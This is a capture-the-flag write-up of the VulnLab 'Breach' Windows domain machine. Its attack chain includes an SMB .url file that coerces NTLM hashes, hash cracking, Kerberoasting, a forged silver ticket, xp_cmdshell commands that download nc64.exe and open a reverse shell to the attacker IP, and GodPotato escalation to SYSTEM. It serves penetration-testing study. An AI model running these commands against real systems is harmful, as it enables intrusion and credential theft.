---
layout: post
date: 2024-06-22 0600 -0500
title: "VulnLab: Breach"
tags:
  - silverticket
  - kerberoasting
  - smb
  - privilege-abuse
image: /images/vulnlab_breach/breach.png
categories:
  - writeups
  - vulnlab
---
## TL;DR

Breach is a **MEDIUM** difficulty machine on [VulnLab](https://wiki.vulnlab.com/guidance/medium/breach). This machine involved abusing anonymous access to an SMB share to upload a URL link file to a specific directory to induce an authentication request from a user and cracking the resulting NetNTLMv2 hash. Using those credentials, we can kerberoast a service account and crack the krb5tgs hash to recover the password of the service, and then use that password to create a silver ticket impersonating the local administrator of the box. With that, we abuse the `xp_cmdshell` functionality on an MS-SQL service to get a shell on the box and capture the first flag. Finally, we can abuse the `SeImpersonatePrivilege` to escalate to SYSTEM and get the final flag.

## Walkthrough

### Nmap

The nmap scan seems fairly normal; I don't see any really weird ports or anything that really stands out to begin with.

```
10.10.106.145:53
10.10.106.145:80
10.10.106.145:88
10.10.106.145:135
10.10.106.145:139
10.10.106.145:389
10.10.106.145:445
10.10.106.145:464
10.10.106.145:593
10.10.106.145:636
10.10.106.145:1433
10.10.106.145:3268
10.10.106.145:3269
10.10.106.145:3389
10.10.106.145:5985
10.10.106.145:9389
10.10.106.145:49664
10.10.106.145:49667
10.10.106.145:49669
10.10.106.145:61306
10.10.106.145:62194
10.10.106.145:62416
```

### Service Enumeration

#### SMB

We can run a quick scan with `NetExec` just to get the domain and computer name.

```
〉nxc smb $ip
SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
```

We don't have any luck with a null session, but we do have anonymous (Guest) access to a few of the network shares. 

```
〉nxc smb $ip -u 'anonymous' -p '' --shares
SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\anonymous: (Guest)
SMB         10.10.106.145   445    BREACHDC         [*] Enumerated shares
SMB         10.10.106.145   445    BREACHDC         Share           Permissions     Remark
SMB         10.10.106.145   445    BREACHDC         -----           -----------     ------
SMB         10.10.106.145   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.10.106.145   445    BREACHDC         C$                              Default share
SMB         10.10.106.145   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.10.106.145   445    BREACHDC         NETLOGON                        Logon server share
SMB         10.10.106.145   445    BREACHDC         share           READ,WRITE
SMB         10.10.106.145   445    BREACHDC         SYSVOL                          Logon server share
SMB         10.10.106.145   445    BREACHDC         Users           READ
```

It probably wasn't SUPER necessary for this box, but since we can read the `IPC$` share, we can grab a list of users using `--rid-brute` with `netexec`. 

```
〉nxc smb $ip -u 'anonymous' -p '' --rid-brute
SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\anonymous: (Guest)
SMB         10.10.106.145   445    BREACHDC         498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.106.145   445    BREACHDC         500: BREACH\Administrator (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         501: BREACH\Guest (SidTypeUser)

[...SNIP...]

SMB         10.10.106.145   445    BREACHDC         1105: BREACH\Claire.Pope (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1106: BREACH\Julia.Wong (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1107: BREACH\Hilary.Reed (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1108: BREACH\Diana.Pope (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1109: BREACH\Jasmine.Price (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1110: BREACH\George.Williams (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1111: BREACH\Lawrence.Kaur (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1112: BREACH\Jasmine.Slater (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1113: BREACH\Hugh.Watts (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1114: BREACH\Christine.Bruce (SidTypeUser)
SMB         10.10.106.145   445    BREACHDC         1115: BREACH\svc_mssql (SidTypeUser)
```

Whittling that down a bit we get this list. We can set this aside for now...SPOILER -- we don't really need it.

```
BREACH\Administrator
BREACH\Guest
BREACH\krbtgt
BREACH\BREACHDC$
BREACH\Claire.Pope
BREACH\Julia.Wong
BREACH\Hilary.Reed
BREACH\Diana.Pope
BREACH\Jasmine.Price
BREACH\George.Williams
BREACH\Lawrence.Kaur
BREACH\Jasmine.Slater
BREACH\Hugh.Watts
BREACH\Christine.Bruce
BREACH\svc_mssql
```

Going back to the list of shares, Checking out the `transfer` directory within the `share` share, we find three user folders. Unfortunately, we don't have anonymous access to any of them. 

```
# cd transfer
# ls
drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .
drw-rw-rw-          0  Fri Jun 21 13:54:30 2024 ..
drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope
drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope
drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong
```

To abuse our write privileges on the `share` share, we can create the following file and name it something like `@secret.url`.

```
[InternetShortcut]
URL=anyurl
WorkingDirectory=anydir
IconFile=\\10.8.2.86\%USERNAME%.icon
IconIndex=1
```

After putting that link file in the `transfer` directory we get an authentication request right away from `julia.wong`.

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.106.145
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:2f03fd15fd6a6f41:B28F8E9168F54C71EE0F1F2438548FC3:0101000000000000004587D6E4C3DA01AD59DFF6B7CFFCBA0000000002000800520042003500450001001E00570049004E002D00540039004B0059004400440049005900490059004D0004003400570049004E002D00540039004B0059004400440049005900490059004D002E0052004200350045002E004C004F00430041004C000300140052004200350045002E004C004F00430041004C000500140052004200350045002E004C004F00430041004C0007000800004587D6E4C3DA0106000400020000000800300030000000000000000100000000200000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000

```

### Foothold

We've got a hash -- let's see if it will crack

```
Julia.Wong::BREACH:2f03fd15fd6a6f41:B28F8E9168F54C71EE0F1F2438548FC3:0101000000000000004587D6E4C3DA01AD59DFF6B7CFFCBA0000000002000800520042003500450001001E00570049004E002D00540039004B0059004400440049005900490059004D0004003400570049004E002D00540039004B0059004400440049005900490059004D002E0052004200350045002E004C004F00430041004C000300140052004200350045002E004C004F00430041004C000500140052004200350045002E004C004F00430041004C0007000800004587D6E4C3DA0106000400020000000800300030000000000000000100000000200000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000
```

The hash cracked almost immediately using JohnTheRipper.

```
〉john --wordlist=/usr/share/wordlists/rockyou.txt julia.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Computer1        (Julia.Wong)
1g 0:00:00:00 DONE (2024-06-21 14:58) 4.761g/s 585142p/s 585142c/s 558545C/s bratz1234..monforte
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We can get the local.txt flag from within the `\share\transfer\julia.wong` folder. 

```
# cd ../transfer

# ls
drw-rw-rw-          0  Fri Jun 21 14:55:39 2024 .
drw-rw-rw-          0  Fri Jun 21 15:13:28 2024 ..
-rw-rw-rw-        103  Fri Jun 21 14:55:40 2024 @secret.url
drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope
drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope
drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong

# cd julia.wong

# ls
drw-rw-rw-          0  Thu Feb 17 05:24:39 2022 .
drw-rw-rw-          0  Fri Jun 21 14:55:39 2024 ..
-rw-rw-rw-         36  Thu Feb 17 05:25:02 2022 local.txt

# cat local.txt
VL{****************}
```

We can confirm that the password works using `netexec`.

```
〉nxc smb $ip -u 'julia.wong' -p 'Computer1'
SMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.106.145   445    BREACHDC         [+] breach.vl\julia.wong:Computer1
```

Unfortunately, logging into the machine via WinRM and RDP did not work here. However, after poking around a bit, we can see two ways to move to the next step: Kerberoasting and "stealing" a hash from the MSSQL service.

#### Stealing the hash

We're able to access the MSSQL service on the machine using the `julia.wong` credentials. Unfortunately, that user is not able to impersonate any other users and does not have permissions to enable `xp_cmdshell`. There's also not really any interesting information stored in the database. However, the `xp_dirtree` method **IS** enabled in MSSQL, so we can use that to trigger an authentication request to our machine by giving the `xp_dirtree` method the UNC path for our machine, as follows:


```

SQL (BREACH\Julia.Wong  guest@master)> xp_dirtree \\10.8.2.86\share
subdirectory   depth   file
------------   -----   ----

```

After running that, we get a NetNTLMv2 hash from the `svc_mssql` user. 

```
[SMB] NTLMv2-SSP Client   : 10.10.106.145
[SMB] NTLMv2-SSP Username : BREACH\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::BREACH:b57510dba0e54bb6:99154DA56D398E95285417022BADC33B:010100000000000000E43590ECC3DA018EC09BDAB9FB81700000000002000800330045004700320001001E00570049004E002D005000340046004D004A0032004E00570042004500370004003400570049004E002D005000340046004D004A0032004E0057004200450037002E0033004500470032002E004C004F00430041004C000300140033004500470032002E004C004F00430041004C000500140033004500470032002E004C004F00430041004C000700080000E43590ECC3DA0106000400020000000800300030000000000000000000000000300000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000

```

That also cracked quickly.

```
〉john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (svc_mssql)
1g 0:00:00:00 DONE (2024-06-21 15:08) 10.00g/s 532480p/s 532480c/s 532480C/s truckin..spook
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Unfortunately, even when accessing the MSSQL service as the `svc_mssql` user, we are still not able to enable the `xp_cmdshell` method. 

#### Kerberoasting

The other, and probably the intended way, to move forward is by Kerberoasting accounts with a Service Principal Name (SPN) configured...basically user accounts configured to run a service. We can do this from Linux using `GetUserSPNs.py`. 

```
〉GetUserSPNs.py -dc-ip $ip -usersfile users.txt breach.vl/julia.wong:Computer1 -request

[...SNIP...]

$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$4a09f433107440b8e60966bbc298712a$4ca88e23438989cd4cf9ce8a48ee449e47157f2ea639377b5a7acc85f36279cfe78077a6a024ab7af9c9cd43140ea79bf531aacb2977b9ff301051709626bea486fd469962a4d8415511f62eda96f5a3778c742c2f7c191c5d606376f807daa317206920a720fa8193387f6ae96e59cea2ecd5477e851e7709d0177b7e62751e9feb763257cc7cd4304ac7489d13ddd442ad738ab5b93f28690f6f163f8bf570058423c9ed2f6d3c4442f04585214bb7a4a9b8d1f8bd4fba4911f113df27e7b17e19b7e820af092069bb570a47811c6979cfb2d00615776883276e7f6373830ce62eb69dc0c560198692a2c2d0687d6435f5b7aa29bb4021ca76c482ff34bde986c0e31c27a2cd08c491172ffac7480bc4e86f76f3707aceefb485f097d48c36164ae65a400cbfb88c409f1b0b8384c177a88c1eb5527ca6a2ddf1adce8090860e4b7e02362f5f6ebdccfb023e4831541378977535d1a56831a4bbd70c5e5f04af5f1c37aca5e330a1dd11b06a6bfb4e71d1759effee6f486c6b3d06daaeaafac657ea41fdeb9b41a97ecba231c4635bd6a18ef560edc9fb5cf2e2a22007ed3c2f083a51da2e9120dc0649925676af8229bba2dee75ccf4e28513889ec98b8fff8afd31a465b68f20c2fdeda592cb6d18de49f05f6e552c4af74c05b027b1ee59088619764ffd226b3516d33371ca4ca879f543e8d475bc52197a9d102bc1d272afc4f2e9d31c8d033c48011060d4bdb776c68f9d2296fbb0d8dde6787a152a30ffbf690c877e5b17c98c16e6fc29b0433adac2dd5df39554986da366dc6ccc883ddfad9cfef58c9b651971ed496ee1d81e129e122fbcc945957fc092f118913cf032dc00115f7c5527eab70df747e7b89de0b5a7829e1ce355dc81f1f7ec98ed4f493be485232bb692ce77b9cf568a0d107451786375aa534ef23c48ac2d2d6601ba9f3b550eb213a0cc9e782dd657936a30ce6370849b0fd3b2488f9e446d9c5e09b67bca52fb5f4130c07dc8d4b4b06631ae480db174d295583cd9e88987161d4f10ce82c24da4e73cfac369040dd7c51a694d4007d42ddbd37dba266cd43ba0cc0fa7775b45487fa69f676b6b76193f29db714e3f1ee08e49c974ea14487165d05d7ba62352026ac01a9eacb52015a0e79450ee32074967a30d657640d765fcc920a85f2a0e545149c7acb1eed4c067cb3264500d7e1a8a0d0718be23900b99ddf82dd3451d3b535a794e2e3061d5494e3f3dc7169a7ba4e135e1c2a87bc84b4ce1543d0425d07b7f70a0fe73debf3428d5adb9be20cc01ee0a00cfc4684a5e0051351f3530e10f417fff0218541bbda5b7a0ede1983bc8367cde265deff1017ecf361c862bde610064d3f586042d41ae9a3e704b3c12c0870b2e64dabb232e76f67bcd1ba3762a3cb4a92037817724f8f12f013816831d51b0ef459a696d1d093c2915ad4d0504cad7de9f2452ccbf03cd9
```

We can also crack the krb5tgs hash to recover the password for the `svc_mssql` user.

#### Silver ticket

In order to create a silver ticket, we need the NT hash of the `svc_mssql` user...not a plaintext password. We can generate an NT using `iconv` and `openssl`. 

```
〉iconv -f ASCII -t UTF-16LE <(printf "Trustno1") | openssl dgst -md4
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
```

Now we also need the domain SID, which we can get using `lookupsid.py` from the Impacket suite.

```
〉lookupsid.py breach.vl/svc_mssql:Trustno1@$ip
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.106.145
[*] StringBinding ncacn_np:10.10.106.145[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856

[...SNIP...]
```

With those two items, we can create the silver ticket with `ticketer.py`, giving us the ability to access the MSSQL service on the DC as the local administrator. By default, the local administrator is a system administrator in MSSQL server, so hopefully we should be able to enable `xp_cmdshell` and get command execution now.

```
〉ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLsvc/breachdc.breach.vl:1433 Administrator
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

In order to be able to use the `Administrator.ccache` file, we need to set that as the value for the `KRB5CCNAME` environment variable, using:

```
export KRB5CCNAME=Administrator.ccache
```

Now we can access the MSSQL service using the credential cache file. Note the `-k` and `-no-pass` arguments here. We're telling `mssqlclient.py` to use Kerberos authentication and to not prompt us for a password. 

```
〉mssqlclient.py -dc-ip $ip -k -no-pass Administrator@breachdc.breach.vl
Impacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> 
```

Perfect! We're able to enable `xp_cmdshell` using the following command from within `mssqlclient.py`:

```
enable_xp_cmdshell
```

If you connected using a different tool, refer to the documentation for how to enable `xp_cmdshell`. 

Now we need to get something on the machine that we can use to get a shell. There is AV on this machine, so some tools may get blocked. If you have time or just want an extra challenge, you can research developing your own custom tooling for this, but since I was doing this box during a hackathon day at work, I just used nc64.exe since I knew (or at least I thought) that id did not get flagged by Defender. We can use the following command to get `nc64.exe` onto the machine.


```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell powershell -c iwr http://10.8.2.86:8000/nc64.exe -outfile c:\windows\tasks\nc64.exe
output
------
NULL
```

And then run it. 

```
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell c:\windows\tasks\nc64.exe 10.8.2.86 9001 -e cmd.exe
```

After running that, we do get a connection back and have an interactive shell as the `svc_mssql` user. 

```
〉rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.2.86] from (UNKNOWN) [10.10.106.145] 51494
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115


[...SNIP...]


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Privilege Escalation

Note that the `svc_mssql` user has `SeImpersonatePrivilege` enabled. This is another exercise of getting something past defender. Ultimately, I used `GodPotato` to abuse the `SeImpersonatePrivilege`. Please note that I renamed the executable to `god.exe` from what it originally was. 

```
C:\Windows\Tasks>.\god.exe -cmd "c:\windows\tasks\nc64.exe 10.8.2.86 9002 -e cmd.exe"
.\god.exe -cmd "c:\windows\tasks\nc64.exe 10.8.2.86 9002 -e cmd.exe"
[*] CombaseModule: 0x140733742317568
[*] DispatchTable: 0x140733744908152
[*] UseProtseqFunction: 0x140733744200496
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\c887be9a-4a1a-4d98-89f9-7df3afae38c3\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009002-120c-ffff-9d52-59f5a25d719f
[*] DCOM obj OXID: 0xdccf82478ef3ca4f
[*] DCOM obj OID: 0xfe77745c6ce234f9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 1020 Token:0x744  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 740

```

After running `GodPotato`, we get another connection back to our machine as `nt authority\system`. 

![](images/vulnlab_breach/Pasted%20image%2020240621164514.png)

Now we can grab the root flag and finish the box! 

```
C:\Windows\Tasks>cd C:\users\administrator\desktop
cd C:\users\administrator\desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B465-02B6

 Directory of C:\Users\Administrator\Desktop

02/17/2022  10:51 AM    <DIR>          .
02/17/2022  09:35 AM    <DIR>          ..
02/17/2022  10:52 AM                36 root.txt
               1 File(s)             36 bytes
               2 Dir(s)  11,743,375,360 bytes free
```


---
## References

[GodPotato](https://github.com/BeichenDream/GodPotato)

